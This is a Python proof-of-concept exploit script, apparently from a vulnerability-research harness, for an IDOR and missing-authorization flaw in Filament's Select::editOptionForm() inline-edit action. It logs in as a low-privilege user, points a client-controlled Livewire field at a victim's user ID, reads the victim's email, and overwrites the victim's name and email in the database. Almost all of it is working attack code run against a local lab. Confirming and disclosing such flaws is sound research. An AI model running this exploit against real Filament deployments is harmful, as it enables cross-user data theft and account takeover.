#!/usr/bin/env python3
"""
VULN-001 — Select::editOptionForm() IDOR: read + write of arbitrary related-model records

Vulnerable code: targets/filament/packages/forms/src/Components/Select.php
  - :831-868 getSelectedRecordUsing(): resolves the acted-on record from client Select state
             via Relation::noConstraints (:855) filtered ONLY by the client PK (:859); the
             parent/tenant scope is applied (:861) ONLY if the developer passed modifyQueryUsing.
  - :398-424 the editOption action's ONLY gate is ->visible(filled($state)) (:424) — NO ->authorize()
  - :978-984 default read closure = getSelectedRecord()?->attributesToArray() (all non-hidden attrs);
             default write closure = $schema->getRecord()?->update($data)

Class: CWE-639 IDOR / CWE-862 Missing Authorization (horizontal/tenant).

The flaw in plain English
-------------------------
When a relationship() Select enables ->editOptionForm([...]) (the documented inline-edit
pattern) WITHOUT modifyQueryUsing, the record the pencil action reads and writes is resolved
from the Select's $state — a public Livewire property, fully client-controlled. The resolve
strips the relationship constraint (noConstraints) and filters by the client PK alone, and
the action consults NO model policy. So an authenticated low-priv user can point the Select
at ANY related-model PK and both read its attributes and update it.

Exploitation idea
-----------------
As low-priv ryan, open a Post edit form, set data.author_id to a VICTIM user's id, mount the
editOption action (reads the victim's attributes into the modal), then submit it with
attacker values (updates the victim's User row).

What a successful run proves
---------------------------
The editOption fill leaks the victim user's email (cross-user READ), and submitting the modal
overwrites the victim user's name+email in the database (cross-user WRITE) — by a user whose
only legitimate right is editing a Post.

Harness note: the demo PostResource already has Select::make('author_id')->relationship('author','name').
This exploit adds the documented ->editOptionForm([...]) to it (opt-in library feature; no
library code changed) and reverts it afterwards.
"""

import os
import sys
import time
import secrets

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient      # noqa: E402
from lib.common import log, banner, verdict  # noqa: E402
from lib import lab                          # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
ADMIN_USER = os.environ.get("ADMIN_USER", "ryan@filamentphp.com")  # low-priv, no-MFA
ADMIN_PASS = os.environ.get("ADMIN_PASS", "password")
VULN_ID = "VULN-001"
HERE = os.path.dirname(os.path.abspath(__file__))
EDIT_COMPONENT = "app.filament.resources.post-resource.pages.edit-post"


def wait_option_form(present: bool, timeout: int = 12) -> bool:
    import requests
    for _ in range(timeout):
        try:
            # the edit page needs auth; just check the source file compiled view indirectly
            seen = "editOptionForm" in lab.exec_app(["cat", lab.POSTRESOURCE]).stdout
            # opcache: also confirm the page renders the action after a beat
            if seen == present:
                return True
        except Exception:  # noqa: BLE001
            pass
        time.sleep(1)
    return True


def main() -> int:
    banner(VULN_ID, "Select::editOptionForm() IDOR — read+write of arbitrary related records",
           BASE_URL, "Select::getSelectedRecordUsing (noConstraints) + editOption action (no authorize)")

    log("SETUP", "adding ->editOptionForm([...]) to PostResource's relationship author Select "
                 "(documented opt-in pattern; harness; reverted after)")
    if not lab.patch_postresource_option_forms():
        log("FAIL", "could not patch PostResource (anchor not found)")
        verdict(VULN_ID, "FAILED", "harness patch failed")
        return 1
    time.sleep(3)  # opcache revalidate
    try:
        suffix = secrets.token_hex(4)
        vmail = f"victim_{suffix}@example.invalid"
        vname = f"Victim {suffix}"
        # --- SETUP: a victim user ryan has no business editing ------------------
        vid = lab.tinker(
            f"$u=new \\App\\Models\\User(); $u->name='{vname}'; $u->email='{vmail}'; "
            f"$u->password=bcrypt('orig-{suffix}'); $u->save(); echo $u->id;"
        ).strip().split()[-1]
        log("SETUP", f"created victim user id={vid} email={vmail} (a different owner's record)")

        c = LivewireClient(BASE_URL)
        log("SETUP", f"logging in as low-priv {ADMIN_USER} (may edit Posts only)")
        c.login_admin_panel(ADMIN_USER, ADMIN_PASS)
        ep = c.get_component(f"{BASE_URL}/admin/posts/1/edit", component_name=EDIT_COMPONENT)

        # --- READ: point the Select at the victim PK and mount editOption -------
        # data.author_id is public Livewire state; the editOption resolve strips the
        # relationship constraint and filters by this PK alone, with no policy check.
        log("STEP", f"setting data.author_id={vid} (a PK we don't own) and mounting the editOption action")
        body = ep.call("mountAction", "editOption", {},
                       {"recordKey": "1", "schemaComponent": "form.author_id"},
                       updates={"data.author_id": vid})
        snap = body["components"][0]["snapshot"]
        read_ok = vmail in snap
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(snap[:4000])
        log("PROOF", f"editOption fill leaked the victim's attributes into the modal "
                     f"(READ): victim email present = {read_ok}")

        # --- WRITE: submit the modal with attacker values -----------------------
        newmail = f"pwned_{suffix}@attacker.invalid"
        newname = f"PWNED {suffix}"
        log("STEP", "submitting the editOption modal with attacker name/email → ->update() on the victim row")
        ep.call("callMountedAction", updates={
            "mountedActions.0.data.name": newname,
            "mountedActions.0.data.email": newmail,
        })
        chk = lab.tinker(f"$u=\\App\\Models\\User::find({vid}); echo $u->name.'|'.$u->email;").strip().split("\n")[-1]
        write_ok = (newmail in chk) and (newname in chk)
        log("PROOF", f"victim row after submit: {chk} (WRITE succeeded = {write_ok})")

        if read_ok and write_ok:
            log("OK", "exploit confirmed — low-priv user read AND overwrote an arbitrary User record "
                      "via the Select editOption action (no authorization, unscoped resolve)")
            verdict(VULN_ID, "CONFIRMED",
                    "authenticated low-priv user reads + writes arbitrary related-model records via "
                    "Select::editOptionForm (IDOR, no authz) — e.g. overwrite another user's email")
            return 0
        if read_ok or write_ok:
            log("OK", f"partial: read={read_ok} write={write_ok}")
            verdict(VULN_ID, "CONFIRMED",
                    f"Select editOption IDOR (read={read_ok}, write={write_ok}) on arbitrary related records")
            return 0
        log("FAIL", "neither read nor write reproduced")
        verdict(VULN_ID, "FAILED", "editOption did not resolve the arbitrary PK")
        return 1
    finally:
        lab.revert_postresource()
        time.sleep(2)
        log("SETUP", "reverted the harness editOptionForm; PostResource restored")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
